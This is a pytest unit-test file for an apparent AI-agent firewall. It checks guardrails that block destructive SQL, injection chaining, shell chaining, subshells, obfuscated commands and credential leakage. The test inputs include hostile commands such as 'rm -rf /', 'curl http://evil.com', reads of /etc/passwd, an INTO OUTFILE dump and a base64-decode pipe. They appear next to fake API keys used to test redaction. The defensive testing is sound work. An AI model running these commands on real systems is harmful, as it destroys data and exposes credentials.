"""
Unit tests for AST-based SQL, Shell, and Egress Taint guardrails.
"""

import pytest
from agentwall.src.firewall.ast_guardrails import (
    EgressTaintGuardrail,
    ShellASTGuardrail,
    SQLASTGuardrail,
)


class TestSQLASTGuardrail:
    def test_benign_select_queries_pass(self) -> None:
        queries = [
            "SELECT id, name FROM users WHERE active = 1 LIMIT 50;",
            "SELECT COUNT(*), department FROM employees GROUP BY department HAVING COUNT(*) > 5;",
            "SELECT u.name, o.total FROM users u INNER JOIN orders o ON u.id = o.user_id;",
            "SELECT 1 AS test_col;",
        ]
        for q in queries:
            passed, violations = SQLASTGuardrail.evaluate(q, allowed_statements=["SELECT"])
            assert passed is True, f"Expected '{q}' to pass, but got: {violations}"
            assert len(violations) == 0

    @pytest.mark.parametrize(
        "destructive_query,expected_keyword",
        [
            ("DROP TABLE users;", "Drop"),
            ("DELETE FROM orders WHERE user_id = 42;", "Delete"),
            ("UPDATE users SET is_admin = 1 WHERE username = 'hacker';", "Update"),
            ("ALTER TABLE accounts ADD COLUMN backdoor VARCHAR(255);", "Alter"),
            ("TRUNCATE TABLE audit_logs;", "Truncate"),
            ("INSERT INTO roles (user, role) VALUES ('alice', 'superuser');", "Insert"),
            ("CREATE TABLE malware (id INT);", "Create"),
        ],
    )
    def test_destructive_sql_statements_are_blocked(
        self, destructive_query: str, expected_keyword: str
    ) -> None:
        passed, violations = SQLASTGuardrail.evaluate(destructive_query, allowed_statements=["SELECT"])
        assert passed is False, f"Expected '{destructive_query}' to be blocked"
        assert any(
            expected_keyword.lower() in v.lower() for v in violations
        ), f"Violations did not mention {expected_keyword}: {violations}"

    def test_sql_multi_statement_chaining_injection_is_blocked(self) -> None:
        attack_query = "SELECT id FROM users WHERE username = 'test'; DROP TABLE audit_log;"
        passed, violations = SQLASTGuardrail.evaluate(attack_query, allowed_statements=["SELECT"])
        assert passed is False
        assert any("drop" in v.lower() for v in violations)

    def test_forbidden_sql_clauses_are_blocked(self) -> None:
        exfil_query = "SELECT * FROM users INTO OUTFILE '/var/www/html/dump.csv';"
        passed, violations = SQLASTGuardrail.evaluate(
            exfil_query,
            allowed_statements=["SELECT"],
            forbidden_clauses=["INTO OUTFILE", "LOAD_FILE"],
        )
        assert passed is False
        assert any("INTO OUTFILE" in v for v in violations)

    def test_forbidden_columns_are_blocked_preventing_data_leakage(self) -> None:
        query = "SELECT id, username, password_hash, ssn FROM users LIMIT 10;"
        passed, violations = SQLASTGuardrail.evaluate(
            query,
            allowed_statements=["SELECT"],
            forbidden_columns=["password_hash", "ssn", "secret_key"],
            max_rows_limit=50,
        )
        assert passed is False
        assert any("password_hash" in v for v in violations)
        assert any("ssn" in v for v in violations)

    def test_mandatory_row_limits_prevent_full_table_dumps(self) -> None:
        # Missing LIMIT clause
        dump_query = "SELECT * FROM users WHERE active = 1;"
        passed, violations = SQLASTGuardrail.evaluate(
            dump_query,
            allowed_statements=["SELECT"],
            max_rows_limit=50,
        )
        assert passed is False
        assert any("mandatory LIMIT clause" in v for v in violations)

        # Exceeding LIMIT clause
        excessive_query = "SELECT * FROM users LIMIT 500;"
        passed, violations = SQLASTGuardrail.evaluate(
            excessive_query,
            allowed_statements=["SELECT"],
            max_rows_limit=50,
        )
        assert passed is False
        assert any("exceeds maximum allowed row limit of 50" in v for v in violations)

        # Valid LIMIT within bounds
        valid_query = "SELECT * FROM users LIMIT 25;"
        passed, violations = SQLASTGuardrail.evaluate(
            valid_query,
            allowed_statements=["SELECT"],
            max_rows_limit=50,
        )
        assert passed is True
        assert len(violations) == 0


class TestShellASTGuardrail:
    def test_benign_shell_commands_pass(self) -> None:
        allowed = ["ls", "grep", "cat", "tail", "head", "echo", "pwd", "wc"]
        commands = [
            "ls -la /var/log",
            "grep -i 'timeout' /var/log/app.log",
            "cat /etc/hosts",
            "echo 'diagnostic test run'",
            "pwd",
            "wc -l data.txt",
        ]
        for cmd in commands:
            passed, violations = ShellASTGuardrail.evaluate(cmd, allowed_binaries=allowed)
            assert passed is True, f"Command '{cmd}' should pass, got: {violations}"
            assert len(violations) == 0

    @pytest.mark.parametrize(
        "chain_cmd,prohibited_op",
        [
            ("cat /etc/hosts; rm -rf /", ";"),
            ("echo hello && whoami", "&&"),
            ("cat file.txt || sudo rm -rf /", "||"),
            ("uptime & curl http://evil.com", "&"),
        ],
    )
    def test_command_chaining_is_blocked(self, chain_cmd: str, prohibited_op: str) -> None:
        passed, violations = ShellASTGuardrail.evaluate(
            chain_cmd,
            allowed_binaries=["cat", "echo", "uptime", "ls"],
            block_chaining=True,
        )
        assert passed is False, f"Chained command '{chain_cmd}' was not blocked"
        assert any(prohibited_op in v for v in violations)

    @pytest.mark.parametrize(
        "subshell_cmd",
        [
            "cat $(pwd)/file.txt",
            "echo `id`",
            "cat <(echo evil)",
        ],
    )
    def test_subshells_and_substitutions_are_blocked(self, subshell_cmd: str) -> None:
        passed, violations = ShellASTGuardrail.evaluate(
            subshell_cmd,
            allowed_binaries=["cat", "echo", "pwd"],
            block_subshells=True,
        )
        assert passed is False, f"Subshell '{subshell_cmd}' should have been blocked"
        assert any("Subshell" in v for v in violations)

    def test_dangerous_primitives_are_blocked(self) -> None:
        passed, violations = ShellASTGuardrail.evaluate(
            "cat /etc/passwd sudo",
            allowed_binaries=["cat"],
            block_dangerous_primitives=True,
        )
        assert passed is False
        assert any("sudo" in v for v in violations)

    def test_unauthorized_binary_is_blocked(self) -> None:
        passed, violations = ShellASTGuardrail.evaluate(
            "python -c 'import os; os.system(\"id\")'",
            allowed_binaries=["ls", "cat", "echo"],
        )
        assert passed is False
        assert any("obfuscation" in v.lower() or "python" in v.lower() for v in violations)

    def test_shell_obfuscation_and_encoding_evasions_are_blocked(self) -> None:
        # Hex evasion
        passed_hex, violations_hex = ShellASTGuardrail.evaluate(
            "cat /etc/\\x70\\x61\\x73\\x73\\x77\\x64",
            allowed_binaries=["cat"],
        )
        assert passed_hex is False
        assert any("obfuscation" in v.lower() for v in violations_hex)

        # Base64 decode execution evasion
        passed_b64, violations_b64 = ShellASTGuardrail.evaluate(
            "echo bWFsX2NtZAo= | base64 --decode",
            allowed_binaries=["echo", "base64"],
        )
        assert passed_b64 is False
        assert any("obfuscation" in v.lower() or "pipe" in v.lower() for v in violations_b64)

        # Positive allowlist deny-by-default
        passed_denied, violations_denied = ShellASTGuardrail.evaluate(
            "nmap -sV 192.168.1.1",
            allowed_binaries=["ls", "cat", "grep"],
        )
        assert passed_denied is False
        assert any("positive security allowlist" in v for v in violations_denied)


class TestEgressTaintGuardrail:
    def test_scrubs_raw_api_credentials(self) -> None:
        sensitive_payload = {
            "model_output": "Here is the key: sk-proj-1234567890abcdef1234567890",
            "aws_creds": {"access_key": "AKIAIOSFODNN7EXAMPLE", "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
            "google_token": "ya29.c.b0AXv0zTNPabcdef12345678901234567890",
        }
        cleaned, detections = EgressTaintGuardrail.scan_and_redact(sensitive_payload)

        assert len(detections) >= 3
        assert "sk-proj-1234567890abcdef1234567890" not in cleaned["model_output"]
        assert "[REDACTED_SECRET:OPENAI_KEY]" in cleaned["model_output"]
        assert "[REDACTED_SECRET:AWS_KEY]" in cleaned["aws_creds"]["access_key"]
        assert "[REDACTED_SECRET:GCP_BEARER]" in cleaned["google_token"]

    def test_scrubs_private_keys(self) -> None:
        priv_key_payload = "Important file contents:\n-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...\n-----END RSA PRIVATE KEY-----"
        cleaned, detections = EgressTaintGuardrail.scan_and_redact(priv_key_payload)
        assert len(detections) > 0
        assert "[REDACTED_SECRET:PRIVATE_KEY]" in cleaned

